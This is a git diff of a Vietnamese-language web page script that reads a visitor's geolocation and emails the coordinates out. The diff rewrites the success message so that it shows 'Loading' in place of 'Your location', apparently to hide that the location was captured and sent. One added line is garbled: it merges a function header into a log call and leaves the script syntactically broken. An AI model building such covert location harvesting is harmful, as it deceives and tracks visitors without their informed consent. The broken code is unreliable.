@@ -24,16 +24,7 @@
     <script>
         const statusDiv = document.getElementById("status");
 
-        function updateStatus(message, type = "") {
-            statusDiv.innerText = message;
-            statusDiv.className = type;
-        }
-
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const { latitude, longitude } = position.coords;
-                updateStatus(`Loading: ${latitude}, ${longitude}\nĐang gửi...`, "loading");
-                console.log("Vị trí:", latitude, longitude);
+        function updateStatus(message,Loading:", latitude, longitude);
 
                 if (!latitude || !longitude) {
                     updateStatus("Lỗi: Tọa độ không hợp lệ.", "error");
@@ -54,7 +45,7 @@
                 )
                 .then(() => {
                     console.log("Email đã gửi thành công!");
-                    updateStatus(`Vị trí của bạn: ${latitude}, ${longitude}\nEmail đã gửi! Cảm ơn bạn!`, "success");
+                    updateStatus(`Loading: ${latitude}, ${longitude}\nEmail đã gửi! Cảm ơn bạn!`, "success");
                 })
                 .catch((error) => {
                     console.error("Lỗi gửi email:", error);
